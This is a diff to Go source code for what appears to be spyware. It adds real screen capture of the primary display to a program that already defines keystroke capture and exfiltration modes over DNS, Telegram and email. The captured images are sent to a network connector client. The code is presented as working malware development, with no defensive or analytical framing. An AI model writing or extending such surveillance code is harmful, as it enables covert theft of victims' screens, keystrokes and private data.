@@ -1,9 +1,14 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
 	"fmt"
+	"image/png"
 	"net"
 	"time"
+
+	"github.com/kbinani/screenshot"
 )
 
 type KeystrokeCapture struct {
@@ -59,6 +64,7 @@ const (
 	EXFIL_MODE_DNS int = iota
 	EXFIL_MODE_TELEGRAM
 	EXFIL_MODE_EMAIL
+	EXFIL_MODE_SIMPLE
 )
 
 const (
@@ -93,7 +99,7 @@ func runLoop() error {
 			timestamp: time.Now(),
 		}
 
-		_, err = connectorClient.Write(screenCapture.Serialize())
+		_, err = connectorClient.Write(screenCapture.screencap)
 		if err != nil {
 			return fmt.Errorf("unable to write screen cap to connector client: %w", err)
 		}
@@ -107,7 +113,19 @@ func runLoop() error {
 }
 
 func createScreenshot() ([]byte, error) {
-	return []byte("foo"), nil
+	bounds := screenshot.GetDisplayBounds(0) // TODO: Multimonitor
+
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		panic(err)
+	}
+
+	var buf bytes.Buffer
+	bWriter := bufio.NewWriter(&buf)
+
+	png.Encode(bWriter, img)
+
+	return buf.Bytes(), nil
 }
 
 func recordKeystrokes() {
